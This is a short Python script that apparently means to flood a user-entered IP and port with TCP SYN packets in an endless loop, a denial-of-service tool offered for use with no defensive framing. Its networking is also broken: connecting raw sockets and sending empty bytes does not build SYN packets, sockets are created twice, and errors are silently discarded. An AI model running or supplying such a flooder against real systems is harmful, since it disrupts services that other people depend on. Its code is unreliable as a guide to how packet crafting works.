import socket
import os

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        return s
    except socket.error as e:
        pass

def generate_random_payload(size):
    return os.urandom(size)

def send_syn_packets(target_ip, target_port, socket_count=1000):
    socket_count = min(socket_count, 500)

    socket_pool = [create_socket() for _ in range(socket_count) if create_socket()]

    payload_size = 0  # SYN packets do not carry a payload

    for s in socket_pool:
        try:
            s.connect((target_ip, target_port))
            s.send(b'')  # Sending an empty string as SYN packet does not have a payload
        except socket.error as e:
            pass

    for s in socket_pool:
        s.close()

if __name__ == "__main__":
    target_ip = input("IP: ")
    target_port = int(input("Port: "))
    while True:
        send_syn_packets(target_ip, target_port)

